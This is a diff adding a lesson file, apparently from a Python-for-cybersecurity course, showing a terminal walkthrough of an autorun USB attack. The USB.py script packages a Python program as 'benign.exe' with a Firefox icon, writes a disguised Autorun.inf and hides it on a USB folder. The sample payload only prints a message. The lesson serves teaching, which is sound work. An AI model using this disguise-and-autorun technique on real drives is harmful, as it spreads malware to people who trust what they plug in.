@@ -1,0 +1,86 @@
+# AUTORUN SCRIPTS LESSON
+
+
+  # cd to lesson folder
+
+~
+❯ cd ~/python-for-cybersecurity/Part_3/3.2\ Autorun\ Scripts/
+
+  # open USB.py
+
+~/python-for-cybersecurity/Part_3/3.2 Autorun Scripts main*
+❯ nano USB.py
+
+
+
+  GNU nano 9.1                                           USB.py                                                     
+import PyInstaller.__main__
+import shutil
+import os
+
+filename = "malicious.py"
+exename = "benign.exe"
+icon = "Firefox.ico"
+pwd = os.getcwd()
+usbdir = os.path.join(pwd,"USB")
+
+if os.path.isfile(exename):
+    os.remove(exename)
+
+# Create executable from Python script
+PyInstaller.__main__.run([
+    "malicious.py",
+    "--onefile",
+    "--clean",
+    "--log-level=ERROR",
+    "--name="+exename,
+    "--icon="+icon
+])
+
+# Clean up after Pyinstaller
+shutil.move(os.path.join(pwd,"dist",exename),pwd)
+for d in ["dist","build","__pycache__"]:
+    if os.path.exists(d):
+        shutil.rmtree(d)
+if os.path.isfile(exename+".spec"):
+    os.remove(exename+".spec")
+
+# Create Autorun File
+with open("Autorun.inf","w") as o:
+    o.write("(Autorun)\n")
+    o.write("Open="+exename+"\n")
+    o.write("Action=Start Firefox Portable\n")
+    o.write("Label=My USB\n")
+    o.write("Icon="+exename+"\n")
+
+# Move files to USB and set to hidden
+shutil.move(exename,usbdir)
+shutil.move("Autorun.inf",usbdir)
+if os.name == 'nt':
+    os.system("attrib +h "+os.path.join(usbdir,"Autorun.inf"))
+
+
+  # END
+
+  # ls our lesson folder
+
+~/python-for-cybersecurity/Part_3/3.2 Autorun Scripts main*
+❯ ls
+.rw-r--r-- 370k nicholas  4 Jul 00:46  Firefox.ico
+.rw-r--r--   34 nicholas  4 Jul 00:46  malicious.py
+.rw-r--r-- 1.1k nicholas  4 Jul 00:46  USB.py
+
+  # run in python, outputs 
+
+~/python-for-cybersecurity/Part_3/3.2 Autorun Scripts main*
+❯ python malicious.py 
+I am a malicious program.
+
+  # run USB auto script
+
+~/python-for-cybersecurity/Part_3/3.2 Autorun Scripts main*
+❯ python USB.py 
+
+
+  # LESSON END
+
